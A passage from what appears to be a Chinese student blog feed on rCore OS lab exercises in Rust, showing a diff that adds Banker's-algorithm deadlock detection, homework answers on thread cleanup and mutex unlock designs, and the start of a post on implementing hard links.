&#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span><span class="token prefix unchanged"> </span><span class="token line">    mutex.lock();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_allocation.push(mutex_id);</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// mutex unlock syscall</span></span>@@ -89,11 +159,22 @@ pub fn sys_mutex_unlock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.mutex_allocation.iter().position(|&amp;x| x == mutex_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.mutex_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mutex.unlock();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -142,10 +223,21 @@ pub fn sys_semaphore_up(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation[index].1 -= 1;</span><span class="token prefix inserted">+</span><span class="token line">        if task_inner.sem_allocation[index].1 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sem.up();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -165,8 +257,89 @@ pub fn sys_semaphore_down(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.sem_need = sem_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.semaphore_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available:Vec&lt;usize> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for sem_opt in &amp;process_inner.semaphore_list &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match sem_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(sem) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let sem_inner = sem.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    available.push(max(sem_inner.count, 0) as usize);</span><span class="token prefix inserted">+</span><span class="token line">                    drop(sem_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => available.push(0),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for (id, alloc) in &amp;task_inner.sem_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*id] += *alloc;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    sem.down();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// condvar create syscall</span></span>@@ -246,6 +419,81 @@ pub fn sys_condvar_wait(condvar_id: usize, mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">///</span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement deadlock detection, but might not all in this syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_enable_deadlock_detect(_enabled: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect NOT IMPLEMENTED");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect");</span><span class="token prefix inserted">+</span><span class="token line">    let process = current_process();</span><span class="token prefix inserted">+</span><span class="token line">    let mut process_inner = process.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let mut flag = 0;</span><span class="token prefix inserted">+</span><span class="token line">    match _enabled &#123;</span><span class="token prefix inserted">+</span><span class="token line">        0 => process_inner.dlcheck_option = false,</span><span class="token prefix inserted">+</span><span class="token line">        1 => process_inner.dlcheck_option = true,</span><span class="token prefix inserted">+</span><span class="token line">        _ => flag = -1,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(process_inner);</span><span class="token prefix inserted">+</span><span class="token line">    flag</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Banker's Algoritm for dead lock check</span><span class="token prefix inserted">+</span><span class="token line">fn deadlock_check(available: Vec&lt;usize>, allocation: Vec&lt;Vec&lt;usize>>, need: Vec&lt;Vec&lt;usize>>) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    // n: thread count  m: resources count</span><span class="token prefix inserted">+</span><span class="token line">    let (n, m) = (allocation.len(), allocation[0].len());</span><span class="token prefix inserted">+</span><span class="token line">    let mut work = available;</span><span class="token prefix inserted">+</span><span class="token line">    let mut finish = vec![false; n];</span><span class="token prefix inserted">+</span><span class="token line">    loop &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        for i in 0..n &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let mut flag = true;</span><span class="token prefix inserted">+</span><span class="token line">            if finish[i] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                continue;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if need[i][j] > work[j] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    flag = false;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            if flag &#123;</span><span class="token prefix inserted">+</span><span class="token line">                idx = i;</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        // has found a thread meet the requirement</span><span class="token prefix inserted">+</span><span class="token line">        if idx != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                work[j] += allocation[idx][j];</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            finish[idx] = true;</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            break;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    finish.iter().all(|&amp;x| x)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span>diff --git a/os/src/task/process.rs b/os/src/task/process.rsindex c2be1ce..471c63a 100644<span class="token coord">--- a/os/src/task/process.rs</span><span class="token coord">+++ b/os/src/task/process.rs</span>@@ -49,6 +49,8 @@ pub struct ProcessControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub semaphore_list: Vec&lt;Option&lt;Arc&lt;Semaphore>>>,</span><span class="token prefix unchanged"> </span><span class="token line">    /// condvar list</span><span class="token prefix unchanged"> </span><span class="token line">    pub condvar_list: Vec&lt;Option&lt;Arc&lt;Condvar>>>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// deadlock check option</span><span class="token prefix inserted">+</span><span class="token line">    pub dlcheck_option: bool,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl ProcessControlBlockInner &#123;</span></span>@@ -119,6 +121,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -245,6 +248,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 0136098..6818590 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span>@@ -5,7 +5,9 @@ use super::&#123;kstack_alloc, KernelStack, ProcessControlBlock, TaskContext&#125;;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;mm::PhysPageNum, sync::UPSafeCell&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use core::cell::RefMut;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::usize;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Task control block structure</span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlock &#123;</span></span>@@ -41,6 +43,14 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// It is set when active exit or execution error occurs</span><span class="token prefix unchanged"> </span><span class="token line">    pub exit_code: Option&lt;i32>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_need: usize, // mutex id need (usize::MAX represents donot need any mutex)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_need: usize,   // semaphore id need (usize::MAX represents donot need any semaphore)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_allocation: Vec&lt;usize>,         // elem: mutex id allocated</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_allocation: Vec&lt;(usize, usize)>,  // elem: (sem id allocated, count allocated)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -75,6 +85,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kstack_top),</span><span class="token prefix unchanged"> </span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: None,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    mutex_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    sem_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    mutex_allocation: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    sem_allocation: Vec::new(),</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p>在我们的多线程实现中，当主线程 (即 0 号线程) 退出时，视为整个进程退出， 此时需要结束该进程管理的所有线程并回收其资源。</p><p><strong>Q1:</strong> 需要回收的资源有哪些？</p><p><strong>A1:</strong> 线程控制块、线程栈、互斥锁、信号量、条件变量等。</p><p><strong>Q2:</strong> 其他线程的 <code>TaskControlBlock</code> 可能在哪些位置被引用，分别是否需要回收，为什么？</p><p><strong>A2:</strong> 线程同步原语中，例如 rCore 信号量的等待队列 <code>wait_queue</code> 中，它们需要被回收，否则可能导致死锁或其他并发问题。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p><strong>Q:</strong> 对比以下两种 <code>Mutex.unlock</code> 的实现，二者有什么区别？这些区别可能会导致什么问题？</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>A:</strong> </p><p>对于 <code>Mutex1</code>，如果有多个线程在等待锁，并且 <code>Mutex1</code> 解锁后立即唤醒一个等待的线程，而此时另一个线程已经获取了锁，那么被唤醒的线程可能会发现锁已经被其他线程持有，从而再次进入等待状态。这会导致不必要的额外等待和上下文切换。例如，假设线程 A 持有锁并解锁，线程 B 和 C 都在等待队列中。线程 A 解锁后，<code>mutex_inner.locked</code> 被设置为 <code>false</code>，然后唤醒线程 B。但在线程 B 开始执行之前，线程 C 已经获取了锁。此时，线程 B 会发现锁已被线程 C 持有，不得不重新进入等待队列。</p><p>对于 <code>Mutex2</code>，如果它解锁时有等待的任务，<code>mutex_inner.locked</code> 不会被设置为 <code>false</code>。这意味着当被唤醒的任务开始执行时，它会看到 <code>locked</code> 仍然是 <code>true</code>，尽管锁实际上已经被释放了。这种情况可能导致被唤醒的任务无法正确获取锁，因为它会认为锁仍然被其他线程持有，从而再次进入等待队列。这会导致死锁或无限循环。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter6练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-03T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:26.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="linkat"><a href="#linkat" class="headerlink" title="linkat"></a>linkat</h3><p>本实验需要实现 3 个与文件系统相关的系统调用，首先是用来创建文件硬链接的 <code>linkat</code>.</p><p>首先介绍一下什么是硬链接，硬链接作为一种抽象概念，可以看作指向一个文件实体的指针，类似于 C++ 中的智能指针 <code>shared_ptr</code>。而从内核代码的角度来看，硬链接在文件系统中的实体就是 <strong>文件目录项</strong> 。每个硬链接对应一个目录项，这个目录项指向一个相同的索引节点（inode），每个 inode 存储了文件的实际数据块（的指针）及其元数据（文件大小、文件类型等）。</p><p>由于 rCore 的文件系统被简化为单级目录（只包含根目录），因此实现 <code>linkat</code> 的思路就很清晰了：根据文件名 <code>old_name</code> 查找其对应的 inode，获取 inode_id 并将引用计数加一，创建一个新的目录项 <code>(new_name, inode_id)</code>，将其插入根目录的数据段末尾。</p><p>需要注意的是，rCore 文件系统的 inode 分为虚拟文件系统层的 <code>Inode</code> 和在持久化设备（硬盘）上实际存储的 <code>DistInode</code>，可以通过 <code>Inode</code> 所实现的 <code>read_disk_inode</code> 和 <code>modify_disk_inode</code> 读取或修改其对应的 <code>DiskInode</code>。因此实际的代码实现，可以按照以下几个步骤进行：</p><ol><li>使用 <code>self.find(old_name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>old_name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>self.read_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的只读引用。获取当前目录下 <code>old_name</code> 文件的 inode_id；获取当前目录的文件数据（目录的文件数据全部由目录项构成）的总大小，记为 <code>offset</code>，用于最后将新目录项添加至末尾。</li><li>使用 <code>inode.modify_disk_inode</code> 获取 <code>old_name</code> 文件的 <code>DiskInode</code> 的可变引用。将其引用计数（原本没有该字段，需要自行添加）加一。</li><li>创建新的目录项，并使用 <code>self.write_at</code> 将其写入偏移量为 <code>offset</code> 的位置。</li></ol><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Create a hard link with new_name for file with old_name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">linkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> old_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> new_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with old_name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>old_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 